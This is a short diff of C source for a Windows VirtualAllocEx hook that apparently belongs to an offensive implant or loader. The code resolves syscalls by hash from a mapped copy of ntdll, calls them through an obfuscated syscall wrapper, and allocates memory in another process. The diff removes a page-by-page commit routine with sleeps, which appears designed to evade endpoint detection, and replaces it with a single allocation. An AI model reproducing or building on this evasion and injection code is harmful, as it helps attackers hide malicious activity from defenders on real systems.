@@ -59,13 +59,9 @@ D_SEC( D ) LPVOID WINAPI VirtualAllocEx_Hook( _In_ HANDLE hProcess, LPVOID Addre
 	OBJECT_ATTRIBUTES	Att;
 
 	SIZE_T			Len = 0;
-	SIZE_T			Max = 0;
-	SIZE_T			Min = 0;
 	NTSTATUS		Nst = STATUS_SUCCESS;
 	
 	HANDLE			Sec = NULL;
-	PVOID			Adr = NULL;
-	PVOID*			Arg = NULL;
 	PVOID			Ntm = NULL;
 	PVOID			Wow = NULL;
 
@@ -96,46 +92,7 @@ D_SEC( D ) LPVOID WINAPI VirtualAllocEx_Hook( _In_ HANDLE hProcess, LPVOID Addre
 	if ( NT_SUCCESS( ( Nst = Api.NtOpenSection( &Sec, SECTION_MAP_EXECUTE | SECTION_MAP_READ, &Att ) ) ) ) {
 		if ( NT_SUCCESS( ( Nst = Api.NtMapViewOfSection( Sec, NtCurrentProcess(), &Ntm, 0, 0, NULL, &Len, ViewUnmap, 0, PAGE_READONLY ) ) ) ) {
 			Sys.NtAllocateVirtualMemory = PeGetFuncEat( Ntm, H_API_NTALLOCATEVIRTUALMEMORY );
-			Nst = Sys.NtAllocateVirtualMemory( hProcess, &Address, 0, &Length, MEM_RESERVE, PAGE_READWRITE );
-
-			if ( NT_SUCCESS( Nst ) ) {
-				/* Calculcuate the max number of chunks to split into */
-				Max = Length / 0x1000 + ( ( Length % 0x1000 ) > 0 ? 1 : 0 );
-				Min = 0x1000;
-
-				/* Enumerate through each mapping, commit */
-				for ( SIZE_T Idx = 0 ; Idx < Max ; ++Idx ) {
-					Adr = C_PTR( U_PTR( Address ) + ( Idx * 0x1000 ) );
-					Min = 0x1000;
-
-					/* Create a buffer to hold our arguments */
-					if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 6 * sizeof( PVOID ) ) ) != NULL ) 
-					{
-						/* Execute NtAllocateVirtualMemory */
-						Arg[ 0 ] = C_PTR( hProcess );
-						Arg[ 1 ] = C_PTR( &Adr );
-						Arg[ 2 ] = C_PTR( 0 );
-						Arg[ 3 ] = C_PTR( &Min );
-						Arg[ 4 ] = C_PTR( MEM_COMMIT );
-						Arg[ 5 ] = C_PTR( Protect );
-						Nst = ObfSystemCall( Sys.NtAllocateVirtualMemory, Arg, 6 );
-
-						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Arg );
-					} else 
-					{
-						/* Notify about lack of reosurces */
-						Nst = STATUS_INSUFFICIENT_RESOURCES;
-					};
-
-					/* Commit a buffer thats a page size each */
-					if ( ! NT_SUCCESS( Nst ) ) {
-						/* Abort! */
-						break;
-					};
-					/* Wait in between */
-					Sleep_Hook( 1000 );
-				};
-			};
+			Nst = Sys.NtAllocateVirtualMemory( hProcess, &Address, 0, &Length, Type, Protect );
 			Api.NtUnmapViewOfSection( NtCurrentProcess(), Ntm );
 		};
 		Api.NtClose( Sec );
